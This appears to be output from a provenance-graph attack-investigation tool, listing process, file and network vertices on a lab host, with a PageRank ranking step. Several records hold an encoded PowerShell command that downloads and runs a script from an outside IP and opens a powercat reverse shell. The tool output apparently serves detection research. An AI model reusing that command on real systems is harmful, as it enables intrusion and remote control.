+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\tzsync.exe.log
+Key: uuid, Value: 2088C65B-C05A-47A8-9D16-55B0AC961F0C
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 338810
+Key: exename, Value: C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7616
+Key: uuid, Value: 31CC2540-3A0F-4588-842B-15296A6007AC
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 338810
+Key: exename, Value: C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7616
+Key: uuid, Value: 31CC2540-3A0F-4588-842B-15296A6007AC
+Vertex ID: 338810
+Key: ownergroupid, Value:  
+Key: exename, Value: C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell_ISE.exe
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7616
+Key: uuid, Value: 31CC2540-3A0F-4588-842B-15296A6007AC
+Vertex ID: 290656
+Key: exename, Value: taskhostw.exe /RuntimeWide
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 5220
+Key: uuid, Value: EE93CC0B-821D-4C3C-8871-BBDD5E7177BB
+Vertex ID: 290673
+Key: ownergroupid, Value:  
+Key: exename, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290673
+Key: exename, Value:  
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: C, Value: \\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\NGenTask.exe
+Key: owneruserid, Value:  
+Key: StopEvent, Value: 460
+Key: pid, Value: 7608
+Key: uuid, Value: E371E8B6-938E-4F62-B321-78725409D145
+Vertex ID: 290656
+Key: ownergroupid, Value:  
+Key: exename, Value: taskhostw.exe /RuntimeWide
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 5220
+Key: uuid, Value: EE93CC0B-821D-4C3C-8871-BBDD5E7177BB
+Vertex ID: 290656
+Key: exename, Value: taskhostw.exe /RuntimeWide
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 5220
+Key: uuid, Value: EE93CC0B-821D-4C3C-8871-BBDD5E7177BB
+Vertex ID: 45489
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config
+Key: uuid, Value: D725237D-8CA4-4876-913A-D51F9700C7B4
+Vertex ID: 45490
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\mscorlib\\8a9c7ab28dfd1baa08e20283667c4c7e\\mscorlib.ni.dll.aux
+Key: uuid, Value: 2297E9EF-6D0D-4A45-84A3-5B9919A1A685
+Vertex ID: 45492
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\ngen.log
+Key: uuid, Value: 38741730-7C7F-498B-BB7E-B0BA5CFADFCE
+Vertex ID: 45491
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\0c9bec7e4e969db233900a4588c91656\\System.ni.dll.aux
+Key: uuid, Value: 1297D5B9-7EC2-4369-A6FA-8166AC976809
+jg generated by the first clause has: 251 vertices and 319 edges.
+after CPR: 251 vertices and 319 edges.
+PROJECTION (1/(abs(r.amount-st.amount)+0.0001), ln(1+1/abs(r.endtime-st.endtime)), count(out(v))/count(in(v)))
+PageRankIteration called!!!!!!!!!!!!!!!!!!
+PageRankIteration - After 133 times iteration, the reputation of each vertex is stable
+PageRankIteration execution time is: 0.053
+Expression: count(in(n))=0
+Operator: =
+Value: 0
+ @@@@@ Top 1: id: 91236 signature: 91236: \\Device\\HarddiskVolume2\\Windows\\System32\\rasman.dll reputation: 0.9743897930909113
+ @@@@@ Top 2: id: 365687 signature: 365687: 128.55.12.67/32:57619->208.75.117.5/32:80 reputation: 0.9743897930909113
+ @@@@@ Top 3: id: 365360 signature: 365360: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.config reputation: 0.9743897930909113
+Vertex ID: 91236
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\rasman.dll
+Key: uuid, Value: 0B91BAC4-675E-4C0D-A780-71FC22B93F5A
+Vertex ID: 91208
+Key: ownergroupid, Value:  
+Key: exename, Value: c:\\windows\\system32\\svchost.exe -k localsystemnetworkrestricted -p -s Netman
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 1944
+Key: uuid, Value: 27BAEEAF-26C8-4562-9C61-29CC48D29639
+Vertex ID: 365665
+Key: ownergroupid, Value:  
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365684
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xi2heiat.ljl.psm1
+Key: uuid, Value: D8CC9027-4895-4175-BFAE-ACCC2FA17C35
+Vertex ID: 365686
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\ProgramData\\update.ps1
+Key: uuid, Value: 40989dd5-c389-4c76-8435-8b6074f19659
+Vertex ID: 365686
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\ProgramData\\update.ps1
+Key: uuid, Value: 40989dd5-c389-4c76-8435-8b6074f19659
+Vertex ID: 365687
+Key: srcip, Value: 128.55.12.67/32
+Key: hostname, Value: RiseLab
+Key: dstport, Value: 80
+Key: srcport, Value: 57619
+Key: dstip, Value: 208.75.117.5/32
+Key: uuid, Value: A2228FBE-118E-44C1-8D52-0A66D3CC12AC
+Vertex ID: 365688
+Key: hostname, Value: RiseLab
+Key: srcip, Value: 128.55.12.67/32
+Key: dstport, Value: 80
+Key: srcport, Value: 57620
+Key: dstip, Value: 208.75.117.6/32
+Key: uuid, Value: 7AD06BC2-3D95-45B2-8DCC-51171B5DDBA0
+Vertex ID: 365685
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2kczjlv4.vlp.ps1
+Key: uuid, Value: B49F3A43-0176-4030-8D06-A4D7EDC08BA2
+Vertex ID: 365685
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2kczjlv4.vlp.ps1
+Key: uuid, Value: B49F3A43-0176-4030-8D06-A4D7EDC08BA2
+Vertex ID: 365684
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xi2heiat.ljl.psm1
+Key: uuid, Value: D8CC9027-4895-4175-BFAE-ACCC2FA17C35
+Vertex ID: 365687
+Key: srcip, Value: 128.55.12.67/32
+Key: hostname, Value: RiseLab
+Key: dstport, Value: 80
+Key: srcport, Value: 57619
+Key: dstip, Value: 208.75.117.5/32
+Key: uuid, Value: A2228FBE-118E-44C1-8D52-0A66D3CC12AC
+Vertex ID: 365688
+Key: hostname, Value: RiseLab
+Key: srcip, Value: 128.55.12.67/32
+Key: dstport, Value: 80
+Key: srcport, Value: 57620
+Key: dstip, Value: 208.75.117.6/32
+Key: uuid, Value: 7AD06BC2-3D95-45B2-8DCC-51171B5DDBA0
+Vertex ID: 368117
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive
+Key: uuid, Value: 61781528-104B-4FCF-9314-519E8E33677A
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: ownergroupid, Value:  
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+- internalJg vertices:9, edges:17
+Vertex ID: 365687
+Key: srcip, Value: 128.55.12.67/32
+Key: hostname, Value: RiseLab
+Key: dstport, Value: 80
+Key: srcport, Value: 57619
+Key: dstip, Value: 208.75.117.5/32
+Key: uuid, Value: A2228FBE-118E-44C1-8D52-0A66D3CC12AC
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365684
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xi2heiat.ljl.psm1
+Key: uuid, Value: D8CC9027-4895-4175-BFAE-ACCC2FA17C35
+Vertex ID: 365686
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\ProgramData\\update.ps1
+Key: uuid, Value: 40989dd5-c389-4c76-8435-8b6074f19659
+Vertex ID: 365686
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\ProgramData\\update.ps1
+Key: uuid, Value: 40989dd5-c389-4c76-8435-8b6074f19659
+Vertex ID: 365687
+Key: hostname, Value: RiseLab
+Key: srcip, Value: 128.55.12.67/32
+Key: dstport, Value: 80
+Key: srcport, Value: 57619
+Key: dstip, Value: 208.75.117.5/32
+Key: uuid, Value: A2228FBE-118E-44C1-8D52-0A66D3CC12AC
+Vertex ID: 365688
+Key: hostname, Value: RiseLab
+Key: srcip, Value: 128.55.12.67/32
+Key: dstport, Value: 80
+Key: srcport, Value: 57620
+Key: dstip, Value: 208.75.117.6/32
+Key: uuid, Value: 7AD06BC2-3D95-45B2-8DCC-51171B5DDBA0
+Vertex ID: 365685
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2kczjlv4.vlp.ps1
+Key: uuid, Value: B49F3A43-0176-4030-8D06-A4D7EDC08BA2
+Vertex ID: 365685
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2kczjlv4.vlp.ps1
+Key: uuid, Value: B49F3A43-0176-4030-8D06-A4D7EDC08BA2
+Vertex ID: 365684
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xi2heiat.ljl.psm1
+Key: uuid, Value: D8CC9027-4895-4175-BFAE-ACCC2FA17C35
+Vertex ID: 365687
+Key: hostname, Value: RiseLab
+Key: srcip, Value: 128.55.12.67/32
+Key: dstport, Value: 80
+Key: srcport, Value: 57619
+Key: dstip, Value: 208.75.117.5/32
+Key: uuid, Value: A2228FBE-118E-44C1-8D52-0A66D3CC12AC
+Vertex ID: 365688
+Key: srcip, Value: 128.55.12.67/32
+Key: hostname, Value: RiseLab
+Key: dstport, Value: 80
+Key: srcport, Value: 57620
+Key: dstip, Value: 208.75.117.6/32
+Key: uuid, Value: 7AD06BC2-3D95-45B2-8DCC-51171B5DDBA0
+Vertex ID: 368117
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive
+Key: uuid, Value: 61781528-104B-4FCF-9314-519E8E33677A
+Vertex ID: 365665
+Key: ownergroupid, Value:  
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+- internalJg vertices:7, edges:15
+- jg vertices:9, edges:17; internalJg vertices:7, edges:15
+
++ jg vertices:9, edges:17
+
+Vertex ID: 365360
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.config
+Key: uuid, Value: D508FB73-C05E-4355-8654-BA13BD7BD4D5
+Vertex ID: 365362
+Key: exename, Value: powershell
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 8724
+Key: uuid, Value: DD97762B-4B23-4BB6-9199-BEB0C1D81A14
+Vertex ID: 365665
+Key: ownergroupid, Value:  
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365380
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_weaiupwp.iyi.ps1
+Key: uuid, Value: 1F41DBF5-5FBE-457E-8DE9-F7EE61837358
+Vertex ID: 365380
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_weaiupwp.iyi.ps1
+Key: uuid, Value: 1F41DBF5-5FBE-457E-8DE9-F7EE61837358
+Vertex ID: 365381
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0dzpisem.ovd.psm1
+Key: uuid, Value: B08F319E-7B69-433A-9EA1-75B415C155D0
+Vertex ID: 365381
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_0dzpisem.ovd.psm1
+Key: uuid, Value: B08F319E-7B69-433A-9EA1-75B415C155D0
+Vertex ID: 365392
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
+Key: uuid, Value: A378E06D-09A0-44F2-8893-AB82767D62F6
+Vertex ID: 365393
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-Interactive
+Key: uuid, Value: 79E217F7-5CE6-4340-A0DB-C5DF05AC9F21
+Vertex ID: 365394
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\powershell.exe.log
+Key: uuid, Value: 70BDAF5C-125D-420D-8B22-2657C4D6F746
+Vertex ID: 365390
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
